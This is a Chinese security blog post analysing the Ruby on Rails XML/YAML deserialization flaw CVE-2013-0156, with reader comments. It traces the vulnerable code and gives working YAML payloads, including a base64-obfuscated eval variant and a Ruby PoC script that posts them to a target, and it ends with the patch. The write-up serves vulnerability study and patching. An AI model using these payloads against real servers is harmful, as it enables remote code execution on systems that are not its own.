@@ -1,0 +1,191 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">分析下难得一见的ROR的RCE（CVE－2013－0156）</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">clozure</a> <span class="bull">·</span> <time title="2013/01/14 11:06" ui-time="" datetime="2013/01/14 11:06" class="published ng-binding ng-isolate-scope">2013/01/14 11:06</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p><strong>0x00 背景</strong></p><p>关于该漏洞的详细说明，GaRY已经在<a href="http://zone.wooyun.org/content/2295">zone中的一文</a>中说的很清楚，因此本文主要的作用是科普下ROR的知识，大牛们请止步.</p><p>简单的说，ROR是一款基于Ruby编程语言（钓鱼岛是中国的，Ruby是全世界的）的敏捷Web开发框架，具有开箱即用的优点，为广大码畜提供了一揽子的MVC解决方案，因此在像笔者这样的自明文艺的码畜中流行度尚可。</p><p>然而，天下没有免费的午餐，对安全来说尤为如此，提供的功能越多，可能出现问题的surface也就越大，终于在ROR诞生的第十个年头出现了第一个广为人知的RCE，也就是本文说的CVE-2013-0156。</p><p><strong>0x01 成因（01）</strong></p><p>为了将广大苦逼的码畜从解析http请求参数的无聊代码中解脱出来，进而以面向对象的范式来操纵用户提交的参数，很多Web开发框架都提供了参数的自动解析功能，以REST闻名进而喜欢在请求和响应中传递对象的ROR当然不会例外。简单的说，如果我们在浏览器中提交如下的表单：</p><pre><code>&lt;form action="/clozure/test1" method="POST"&gt;  
+      &lt;input type="text" name="wooyun[foo]" /&gt;  
+      &lt;input type="text" name="wooyun[bar][pie]" /&gt;  
+      &lt;input type="submit" /&gt;
+
+&lt;/form&gt; 
+</code></pre><p>在我们的controller中，我们将经过ROR解析过的参数以yaml的格式dump出来：</p><pre><code>def test1  
+     render :text =&gt; params.to_yaml
+
+end
+</code></pre><p>会得到如下的显示：</p><pre><code>---| !ruby/hash:ActiveSupport::HashWithIndifferentAccess  
+wooyun: !ruby/hash:ActiveSupport::HashWithIndifferentAccess  
+  foo: v1  
+  bar: !ruby/hash:ActiveSupport::HashWithIndifferentAccess  
+    pie: v2  
+controller: test
+
+action: test1
+</code></pre><p>我们可以看到，ROR自动帮我们生成了一个hash，其中第二个key（bar）对应的value还是一个嵌套hash，这样我们就成功的向controller中注入了一个对象。</p><p>等等，这样就注入一个对象是不是太简单了，而且这能有啥用？CVE－2012-6496告诉我们，如果我们在代码中写了类似下文的代码，并且我们能完全控制提交的参数的值，就会出现SQL注入：</p><pre><code>User.find_by_id(params["id"])
+</code></pre><p>这样，只要我们能使参数中id对应的value是个hash，并且hash中有个叫:selection的key，我们就可以控制数据库了。可是，我们真的完全控制id对应的value了吗？明显没有，大家仔细看上面的YAML会发现，那个Hash是HashWithIndifferentAccess，它的所有key都是String，不能是像:selection这样的Symbol，所以CVE－2012-6496的利用情况比较苛刻，除非是像poc作者提到的那样的从cookie中传进去带有类型是Symbol的key的hash，一般情况下不会出现该注入漏洞。</p><p><strong>0x02 成因（02）</strong></p><p>就在我们一筹莫展的时候，CVE-2013-0156来了，它告诉我们原来ROR不止会帮我们解析类似上面那个HTML中提到的参数，还会帮我们解析其他格式的请求，如JSON、XML、YAML等。</p><p>JSON格式比较简单，只能有些数组、hash、字符串之类的良民对象，可YAML就不同了，YAML是可以指定TAG的，通过TAG，我们可以让ROR将参数解析成ROR中任意已经load进来的Class的对象，这个危害就大了。这也是为什么在较高版本的ROR里面，YAML的解析会被默认禁用掉的原因：</p><pre><code>DEFAULT_PARSERS = {  
+      Mime::XML =&gt; : xml_simple,  
+      Mime::JSON =&gt; :json
+
+}
+</code></pre><p>看，没有YAML吧？（坏笑）</p><p>然而我们不要忘了XML，xml的解析是默认打开的，在解析xml的过程中，ROR使用了如下代码：</p><pre><code>when : xml_simple, : xml_node  
+          data = Hash.from_xml(request.raw_post) || {}
+
+          data.with_indifferent_access
+</code></pre><p>看到data.with&#95;indifferent&#95;access断了我们key的类型是Symbl的Hash对象的幻想的同时，我们继续跟进Hash.from_xml，会看到它进而调用了：</p><pre><code>def typecast_xml_value(value)  
+        case value.class.to_s  
+          when 'Hash'  
+            if value['type'] == 'array'  
+              ....  
+              ...  
+            elsif .. ||  (value["**content**"] &amp;&amp;   
+                 (value.keys.size == 1 ||value["**content**"].present?))  
+              content = value["**content**"]  
+              if parser = ActiveSupport::XmlMini::PARSING[value["type"]]  
+                parser.arity == 1 ? parser.call(content) : parser.call(content, value)  
+              else  
+                content  
+              end  
+            .....  
+            end  
+          when 'Array'  
+            value.map! { |i| typecast_xml_value(i) }  
+            value.length &gt; 1 ? value : value.first  
+          when 'String'  
+            value  
+        end
+
+      end
+</code></pre><p>这段代码笔者刚看时也没看出有啥问题来，后来根据POC和Gary大牛的指导，才知道xml里的node可以制订type，而type只要在ActiveSupport::XmlMini::PARSING中，就会被解析！如果type被指定为YAML呢？答案是可以解析，这样，我们又回到了成因（1）结束的地方，只不过这次我们不是直接吧http请求的content－type指定为application/yaml，而是指定为application/xml，同时将其中一个node的type指定为yaml。</p><p>针对上面描述的SQL注入，虽然我们还是没法注入带Symbol类型key的Hash对象（万恶的withIndifferent），但是POC作者给出了使用SqlLiteral进行注入的思路，即我们需要提交一个如下的XML到有注入漏洞的controller</p><pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;  
+&lt;id type="yaml"&gt;  
+---| !ruby/string:Arel::Nodes::SqlLiteral  
+"1 or 1=1"
+
+&lt;/id&gt;
+</code></pre><p>此处，YAML的TAG比较复杂：“ruby/string:Arel::Nodes::SqlLiteral”，简单的说，此处是以string的方式解析“1 or 1=1”这个字符串，也就相当于调用了SqlLiteral.new("1 or 1=1"),这样就能进行广大黑阔们最爱的SQL注入了。</p><p><strong>0x03 进阶</strong></p><p>都能注入YAML对象了，还得去找个2B码畜的代码来进行SQL注入？postmodern大牛说这简直弱爆了，于是给出了一个RCE，因为参数解析发生在url路由之前，只要参数确实被解析了，就可以无视Controller的存在性，无视是GET还是POST，甚至无视代码是怎么写的。</p><p>简单的说，YAML有几种解析方式，如果以“&#45;--||||||||||| !ruby/string”为前缀，后面的字符串相当于传给了构造函数，如果以“&#45;--||||||||||| !ruby/object“为前缀，后面的Hash相当于设置对象的实例变量，如果以“&#45;--||||||||||| !ruby/hash”为前缀，则相当于在对象上调用obj[key]=val，限于篇幅，读者可以自己去看一下ROR中YAML的解析部分代码，此处略去。</p><p>奇葩的是，在ruby中，obj[key]=val这样的赋值操作是有一个专门的函数"[]="来完成的，postmodern找到了在ActionDispatch::Routing::RouteSet::NamedRouteCollection的"[ ]="方法里面有一个对key进行eval的代码路径：</p><pre><code>alias []=   add  
+...  
+def add(name, route)  
+    routes[name.to_sym] = route  
+    define_named_route_methods(name, route)  
+end
+
+def define_named_route_methods(name, route)  
+    {:url =&gt; {:only_path =&gt; false}, :path =&gt; {:only_path =&gt; true}}\  
+          .each do |kind, opts|  
+              #by clozure  
+              #require 'logger'  
+              #Logger.new("/tmp/rails.logger").info(route)  
+              hash = route.defaults.merge(:use_route =&gt; name).merge(opts)  
+              define_hash_access route, name, kind, hash  
+              define_url_helper route, name, kind, hash  
+          end  
+end
+
+def define_hash_access(route, name, kind, options)  
+     selector = hash_access_name(name, kind)  
+     #by clozure  
+     #require 'logger'  
+     #Logger.new("/tmp/rails.log").info(selector)  
+     # We use module_eval to avoid leaks  
+    <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ce0c6e8ea3a1aabba2abe0a3a1aabba2ab">[email&#160;protected]</a>_eval &lt;&lt;-END_EVAL, **FILE**, **LINE** + 1  
+         remove_possible_method :#{selector}  
+     ... ...  
+end
+
+def hash_access_name(name, kind = :url)
+
+    :"hash_for_#{name}_#{kind}"
+
+end
+</code></pre><p>从上面的代码中，我们可以看到，NamedRouteCollection把"[ ] ="方法别名到了add方法，add方法进而调用了define&#95;named&#95;route&#95;methods，最后在define&#95;hash&#95;access中我们看到了可爱的module&#95;eval，在eval块里面，有个被替换的变量selector来自name，这样，我们只需要巧妙构造下name就可以执行任意ruby代码了！</p><p>我们在rails console中做个小试验：</p><pre><code>[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c1a2adaebbb4b3a481a2adaebbb4b3a4eca0a8b3">[email&#160;protected]</a>:OOXX]$ rails c  
+Loading development environment (Rails 3.2.11)  
+1.9.3-p362 :001 &gt;  
+1.9.3-p362 :001 &gt; test = ActionDispatch::Routing::RouteSet::NamedRouteCollection.new  
+ =&gt; #&lt;ActionDispatch::Routing::RouteSet::NamedRouteCollection:0x007fef2abcc7f0 @routes={}, @helpers=[], @module=#&lt;Module:0x007fef2abcc6d8&gt;&gt;  
+1.9.3-p362 :002 &gt; test['clozure;sleep(10);clozure'] = {}  
+NoMethodError: undefined method `defaults' for {}:Hash&lt;br /&gt;&lt;p&gt;&lt;br /&gt;
+     from /Users/clozure/.rvm/gems/ruby-1.9.3-p362/gems/actionpack-3.2.11/lib/action_dispatch/routing/route_set.rb:168:in`block in define_named_route_methods'
+</code></pre><p>本想sleep(10)，结果不仅报错了，也没sleep成，看下报错信息，是在下面这行报错的：</p><pre><code>hash = route.defaults.merge(:use_route =&gt; name).merge(opts)
+</code></pre><p>这个我们貌似看到过吧？是的，就在define&#95;hash&#95;access调用的上面，还有这么一个拦路虎，它在我们的value上调用了defaults方法，我们的{}一无所有，怎么会有defaults方法呢？</p><p>这时候，我们需要OpenStruct对象出场了，出于ruby的meta programming需求，当我们OpenStruct.new("foo" => "bar")时，新创建的对象就自动有了一个foo方法，其返回值是bar，当然，你可以在bar的位置写个动态的lambda表达式，体验一把函数式编程，不过与我们的主题无关了。ok，继续试验：</p><pre><code>1.9.3-p362 :003 &gt; test = ActionDispatch::Routing::RouteSet::NamedRouteCollection.new  
+ =&gt; #&lt;ActionDispatch::Routing::RouteSet::NamedRouteCollection:0x007fef2ab551a0 @routes={}, @helpers=[], @module=#&lt;Module:0x007fef2ab55038&gt;&gt;  
+1.9.3-p362 :004 &gt; test['clozure;sleep(10);clozure'] = OpenStruct.new("defaults" =&gt; {})
+
+NameError: undefined local variable or method `clozure_url' for #&lt;Module:0x007fef2ab55038&gt;
+</code></pre><p>这次程序睡足了10秒钟，然后抱怨找不到cojzure_url变量，已经做过了我们目标的eval语句，执行代码成功！</p><p>现在我们的问题变成了怎么把这个OpenStruct放到YAML里面，我们貌似没法在YAML里面给对象指定构造函数的非String的参数吧？看下OpenStruct的实现代码，我们发现它所有的“函数名=><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="14fcab80f18f8af194a8f69489f1bbadf1ae80f191a7f3a7aff28cbbf0ab89f1b98cf188bc546075767871f1ba8af0aa9ff19b8cfd939bfd9398fd89b6f38e90">[email&#160;protected]</a>，这就轮到“&#45;--||||||||||| !ruby/object“前缀的YAML出场了，通过他我们可以设置实例变量，这样所有的拼图就完整了，我们得到了如下的嗜睡的poc：</p><pre><code>xml = %{  
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;  
+&lt;bingo type='yaml'&gt;  
+---| !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection  
+'test; sleep(10); test' :  
+ !ruby/object:OpenStruct  
+  table:  
+   :defaults: {}  
+&lt;/bingo&gt;
+
+}.strip
+</code></pre><p>(后来大家发现&#45;--||||||||||| !ruby/struct可以达到与OpenStruct类似的功效，有兴趣的童鞋可以研究下)</p><p>测试代码如下：</p><pre><code>#!/usr/bin/env ruby
+
+require 'ronin/network/http'
+require 'ronin/ui/output'
+require 'yaml'
+
+include Ronin::Network::HTTP
+include Ronin::UI::Output::Helpers
+
+url   = ARGV[0]
+
+# xml = %{
+# &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+# &lt;bingo type='yaml'&gt;
+# --- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
+# 'test; eval(%[Y29kZSA9ICdjM2x6ZEdWdEtDZGxZMmh2SUNJeE1URWlJRDRnTDNSdGNDOW1kV05yWm5WamF5Y3AnLnVucGFjaygibTAiKS5maXJzdAppZiBSVUJZX1BMQVRGT1JNID1+IC9tc3dpbnxtaW5nd3x3aW4zMi8KaW5wID0gSU8ucG9wZW4oInJ1YnkiLCAid2IiKSByZXNjdWUgbmlsCmlmIGlucAppbnAud3JpdGUoY29kZSkKaW5wLmNsb3NlCmVuZAplbHNlCmlmICEgUHJvY2Vzcy5mb3JrKCkKZXZhbChjb2RlKSByZXNjdWUgbmlsCmVuZAplbmQ=].unpack(%[m0])[0]);' :
+#  !ruby/object:OpenStruct
+#   table:
+#    :defaults: {}
+# &lt;/bingo&gt;
+# }.strip
+
+# xml = %{
+# &lt;?xml version="1.0" encoding="UTF-8"?&gt;
+# &lt;bingo type='yaml'&gt;
+# --- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
+# 'test; system("touch /tmp/rails");' :
+#  !ruby/object:OpenStruct
+#   table:
+#    :defaults: {}
+# &lt;/bingo&gt;
+# }.strip
+
+xml = %{
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;bingo type='yaml'&gt;
+--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection
+'test; sleep(10);' :
+ !ruby/object:OpenStruct
+  table:
+   :defaults: {}
+&lt;/bingo&gt;
+}.strip
+
+response = http_post(
+  :url       =&gt; url,
+  :headers   =&gt; {
+    :content_type           =&gt; 'text/xml',
+    :\x_http_method_override =&gt; 'post'
+  },
+  :body      =&gt; xml
+)
+
+print_debug "Received #{response.code} response"
+
+puts response.code
+case response.code
+when '200' then print_info  response.body + " ok"
+when '404' then print_error "Not found"
+when '500' then print response.body
+end
+</code></pre><p><strong>0x04 补丁</strong></p><p>在笔者下载到的最新版Rails中，已经做了如下处理：</p><pre><code>def typecast_xml_value(value, disallowed_types = nil)  
+    disallowed_types ||= DISALLOWED_XML_TYPES  
+    case value.class.to_s  
+    when 'Hash'  
+        if value.include?('type') &amp;&amp; !value['type'].is_a?(Hash) &amp;&amp; dis\  
+            allowed_types.include?(value['type'])  
+            raise DisallowedType, value['type']  
+        end  
+... ...
+
+DISALLOWED_XML_TYPES = %w(symbol yaml)
+</code></pre><p>这样，xml里面node的type不能为yaml和symbol了，也就解决了这个问题</p><p>P.S. 初次些东西，前言不搭后语，大家见谅</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/680" rel="bookmark" id="re1">Zabbix SQL Injection/RCE – CVE-2013-5743</a></li><li><a href="http://drops.wooyun.org/papers/2466" rel="bookmark" id="re2">CRLF Injection漏洞的利用与实例分析</a></li><li><a href="http://drops.wooyun.org/papers/892" rel="bookmark" id="re3">调皮的location.href</a></li><li><a href="http://drops.wooyun.org/papers/1419" rel="bookmark" id="re4">弱随机化种子漏洞科普</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">枯荣</span> <span class="reply-time">2015-08-05 16:35:49</span></div><p></p><p>我把知识库从发的第一个看下去 然后把洞也都看一遍，留名 MVC是一个框架，编程模式。CVE-2013-0156（Ruby on Rails XML参数注入漏洞）； 在MVC 中，控制器Controller 负责处理由DispatcherServlet 分发的请求，它把用户请求的数据经过业务处理层处理之后封装成一个Model ，然后再把该Model 返回给对应的View 进行展示。<br>其实马马虎虎看懂了点 因为不懂ruby，下次回头再看<br>YAML是“另一种标记语言”的外语缩写（见前方参考资料原文内容）；但为了强调这种语言以数据做为中心，而不是以置标语言为重点，而用返璞词重新命名。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">hqdvista</span> <span class="reply-time">2013-02-16 16:55:38</span></div><p></p><p>赞残疾人大牛</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">se55i0n</span> <span class="reply-time">2013-01-21 13:04:21</span></div><p></p><p>楼主分析得相当赞呀，学习了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">gniq</span> <span class="reply-time">2013-01-14 23:33:56</span></div><p></p><p>牛逼</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsjswt</span> <span class="reply-time">2013-01-14 18:39:14</span></div><p></p><p>赞残疾人大牛</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Ray</span> <span class="reply-time">2013-01-14 17:01:50</span></div><p></p><p>牛逼啊。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">goderci</span> <span class="reply-time">2013-01-14 15:40:13</span></div><p></p><p>赞残疾人大牛！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2013-01-14 11:36:13</span></div><p></p><p>赞，这比单独一个漏洞预警不知道要好多少啊</p><p></p></div></div></div></div></div></main>
